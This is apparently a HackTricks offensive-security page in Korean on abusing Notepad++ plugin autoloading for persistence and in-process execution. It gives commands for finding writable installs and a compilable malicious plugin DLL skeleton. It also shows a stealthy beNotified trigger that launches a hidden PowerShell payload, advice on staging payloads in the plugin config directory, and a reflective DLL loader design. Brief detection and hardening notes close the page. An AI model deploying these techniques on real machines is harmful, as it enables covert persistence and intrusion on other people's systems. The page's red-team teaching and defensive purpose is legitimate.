# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++는 실행 시 `plugins` 하위 폴더에서 발견되는 모든 plugin DLL을 **autoload**합니다. 쓰기 가능한 **Notepad++ 설치본**에 악성 plugin을 드롭하면 에디터가 시작될 때마다 `notepad++.exe` 내부에서 code execution이 발생하며, 이를 **persistence**, 은밀한 **initial execution**, 또는 에디터가 elevated로 실행될 때 **in-process loader**로 악용할 수 있습니다.

**Notepad++ 7.6+**부터 기대되는 수동 설치 레이아웃은 plugin당 하위 폴더 1개(`plugins\<PluginName>\<PluginName>.dll`)입니다. **portable mode**(`notepad++.exe` 옆에 `doLocalConf.xml`이 존재)에서는 애플리케이션 트리 전체가 해당 디렉터리에 로컬로 유지되므로, 복사된/admin tool 번들이 쉽게 user-writable execution surface가 되는 경우가 많습니다.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (보통 쓰기 위해 admin 권한이 필요).
- Low-privileged operator를 위한 writable 옵션:
- 사용자 쓰기 가능 폴더에서 **portable Notepad++ build**를 사용.
- `C:\Program Files\Notepad++`를 사용자 제어 경로(예: `%LOCALAPPDATA%\npp\`)로 복사한 뒤 거기서 `notepad++.exe` 실행.
- 이미 `doLocalConf.xml`을 포함하고 `Program Files` 밖에 있는 **admin tool bundles**, 압축 해제된 zip 사본, 또는 help-desk toolkits를 찾기.
- 각 plugin은 `plugins` 아래에 자기 전용 하위 폴더를 가지며 시작 시 자동으로 로드되고, 메뉴 항목은 **Plugins** 아래에 나타남.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++는 특정 **exported functions**를 기대합니다. 이들은 초기화 중 모두 호출되며, 여러 execution surface를 제공합니다:
- **`DllMain`** — DLL load 시 즉시 실행됩니다(첫 번째 execution point).
- **`setInfo(NppData)`** — load 시 한 번 호출되어 Notepad++ handles를 제공합니다. 보통 menu items를 등록하는 위치입니다.
- **`getName()`** — menu에 표시되는 plugin name을 반환합니다.
- **`getFuncsArray(int *nbF)`** — menu commands를 반환합니다. 비어 있어도 startup 중 호출됩니다.
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla events를 받습니다(user action 또는 editor event까지 payload를 지연시키는 데 유용).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler로, 더 큰 data exchanges에 유용합니다.
- **`isUnicode()`** — load 시 확인되는 compatibility flag입니다.

대부분의 exports는 **stubs**로 구현할 수 있습니다. execution은 autoload 중 `DllMain` 또는 위의 어떤 callback에서도 발생할 수 있습니다.

## Minimal malicious plugin skeleton
예상되는 exports를 가진 DLL을 컴파일하고, writable Notepad++ folder 아래 `plugins\\MyNewPlugin\\MyNewPlugin.dll`에 배치합니다:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL을 빌드합니다 (Visual Studio/MinGW).
2. `plugins` 아래에 plugin 하위 폴더를 만들고 그 안에 DLL을 넣습니다.
3. Notepad++를 재시작합니다. DLL이 자동으로 로드되며, `DllMain`과 이후 callbacks가 실행됩니다.

## `beNotified`를 통한 low-noise trigger pattern
OPSEC를 위해 많은 payload는 `DllMain`에서 **실행되면 안 됩니다**. 더 조용한 pattern은 plugin이 깨끗하게 로드되도록 한 뒤, **startup complete**, **buffer activation**, 또는 **첫 번째로 입력된 문자** 같은 현실적인 editor event 이후에만 실행하는 것입니다.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
이것은 시끄러운 `DllMain` beacon보다 공개 offensive research에 더 잘 맞는다: DLL은 여전히 시작 시 autoload되지만, 악성 동작은 Notepad++가 실제로 사용 중인 것처럼 보일 때까지 지연된다.

## plugin config directory를 secondary storage로 사용하기
Notepad++는 `NPPM_GETPLUGINSCONFIGDIR`을 제공하며, 이는 **현재 사용자의 plugin configuration directory**를 반환한다. 악성 plugin은 이를 사용해 on-disk DLL을 최소한으로 유지하면서, 암호화된 config, staged payloads, 또는 tasking files를 일반적인 plugin state에 섞여 보이는 path에 저장할 수 있다.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
운영상 이것은 다음과 같은 경우에 유용하다:
- 아주 작은 autoloaded bootstrap DLL;
- 메인 plugin binary를 다시 건드리지 않고 per-user tasking 수행;
- **autoload trigger**와 더 무거운 second stage를 분리.

## Reflective loader plugin pattern
무기화된 plugin은 Notepad++를 **reflective DLL loader**로 바꿀 수 있다:
- 최소한의 UI/menu entry 제공(예: "LoadDLL").
- payload DLL을 가져오기 위해 **file path** 또는 **URL**을 받음.
- DLL을 현재 process에 reflectively map하고 exported entry point를 호출함(예: 가져온 DLL 안의 loader function).
- 이점: 새 loader를 실행하는 대신 겉보기에는 정상적인 GUI process를 재사용함; payload는 `notepad++.exe`의 integrity를 상속받음(상승된 context 포함).
- Trade-offs: **unsigned plugin DLL**을 disk에 drop하면 눈에 띄는 소음이 발생함; 실용적인 변형은 autoloaded plugin을 stub으로만 사용하고 실제 implant는 다른 곳에 encrypted/staged 상태로 두는 것이다.

## Detection and hardening notes
- Notepad++ plugin directories에 대한 **writes**를 차단하거나 모니터링할 것(사용자 profile의 portable copy 포함); controlled folder access 또는 application allowlisting을 활성화할 것.
- `plugins` 아래의 **new unsigned DLLs**, portable Notepad++ tree의 변경, 그리고 `notepad++.exe`의 비정상적인 **child processes/network activity**에 대해 alert할 것.
- 정상 plugin을 baseline으로 잡고, 일반적인 Notepad++ plugin interface를 export하면서도 shell, PowerShell, 또는 network beacon을 생성하는 새 DLL은 조사할 것.
- plugin 설치는 **Plugins Admin**을 통해서만 강제하고, untrusted path에서 실행되는 portable copy는 제한할 것.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
